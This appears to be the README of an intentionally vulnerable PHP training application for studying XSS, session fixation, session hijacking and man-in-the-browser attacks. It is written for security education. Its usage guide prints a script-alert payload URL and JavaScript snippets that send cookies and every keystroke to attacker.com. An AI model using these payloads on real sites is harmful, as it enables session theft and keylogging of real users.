# XSS MasterLab: Cross-Site Scripting Vulnerability Simulator  

![XSS MasterLab Banner](https://via.placeholder.com/1200x400?text=ss.png)  


## Overview  
**XSS MasterLab** is a comprehensive educational platform designed for cybersecurity professionals, developers, and students to safely study, demonstrate, and understand Cross-Site Scripting (XSS) vulnerabilities in a controlled environment. This intentionally vulnerable web application simulates real-world scenarios to teach offensive security techniques and defensive countermeasures.

## Key Features  
- 🎯 **Complete XSS Vulnerability Suite**: Reflected, Stored, and DOM-based XSS
- 🔓 **Session Attacks**: Session fixation, session hijacking, and ID brute-forcing
- 🕵️ **MITB Simulation**: Realistic Man-in-the-Browser attack demonstration
- 🛡️ **Security Labs**: Hands-on vulnerability exercises with clear learning objectives
- 📊 **Visual Analytics**: Attack visualization and impact demonstration
- 🧩 **Modular Design**: Extensible architecture for adding new vulnerabilities
- 🎨 **Professional UI**: Clean, responsive interface with theme customization

## Vulnerability Matrix  
| Attack Type          | File         | Vulnerability Class       |
|----------------------|--------------|---------------------------|
| Reflected XSS        | index.php    | Non-sanitized GET input   |
| Stored XSS           | comment.php  | Unsanitized user content  |
| DOM-Based XSS        | index.php    | Unsafe document.write()   |
| Session Fixation     | login.php    | Predictable session IDs   |
| Session Bruteforce   | brute.php    | Short session identifiers |
| MITB Attack          | mitb.php     | Credential theft via XSS  |
| Session Hijacking    | profile.php  | Missing HttpOnly flag     |

## Setup Instructions  
1. **Requirements**:  
   - XAMPP/WAMP server (PHP 7.4+)
   - Modern web browser

2. **Installation**:  
   ```bash
   # Clone repository
   git clone https://github.com/your-username/xss-masterlab.git
   
   # Move to htdocs
   mv xss-masterlab /path/to/xampp/htdocs/
   
   # Create storage directory
   mkdir store
   chmod 777 store
   ```

3. **Access Application**:  
   `http://localhost/xss-masterlab/index.php`

## Usage Guide  
### Basic Attacks  
1. **Reflected XSS**:  
   `http://localhost/xss-masterlab/index.php?name=<script>alert(1)</script>`

2. **Stored XSS**:  
   - Submit malicious script via comment.php
   - View payload execution in view.php

3. **Session Bruteforce**:  
   - Visit brute.php to get session ID
   - Bruteforce with: `brute.php?sid=GUESS`

### Advanced Scenarios  
```javascript
// Session Hijacking Payload
fetch('https://attacker.com/steal?cookie=' + document.cookie)

// Keylogger Implementation
document.addEventListener('keypress', (e) => {
  fetch('https://attacker.com/log?key=' + e.key)
})
```

### MITB Attack  
1. Navigate to mitb.php
2. Enter credentials in fake login form
3. Observe credential theft simulation

## Security Features  
While demonstrating vulnerabilities, XSS MasterLab includes safety measures:
- Isolated environment with no external network access
- Automatic session expiration
- IP-based request logging
- Content Security Policy headers (disabled for training)
- Clear security warnings throughout UI

## Ethical Use Disclaimer  
> **Warning**: This application contains intentional security vulnerabilities. Never deploy on public servers or networks accessible to untrusted parties. Use exclusively for:
> - Security education
> - Penetration testing training
> - Secure coding demonstrations
> - Security awareness workshops

Unauthorized use for attacking systems without explicit permission is illegal.

## Contributing  
We welcome contributions! Please follow these steps:
1. Fork the repository
2. Create a new branch (`git checkout -b feature/improvement`)
3. Commit changes (`git commit -am 'Add new feature'`)
4. Push to branch (`git push origin feature/improvement`)
5. Create new Pull Request

## License  
This project is licensed under the **Educational Community License v2.0**  
Copyright © 2025 Netrinix Solutions. All rights reserved.

---
**Developed for Educational Purposes by Netrinix Security Labs**  
[Report Issues](mailto:security@netrinix.com) | [Request Features](mailto:features@netrinix.com)
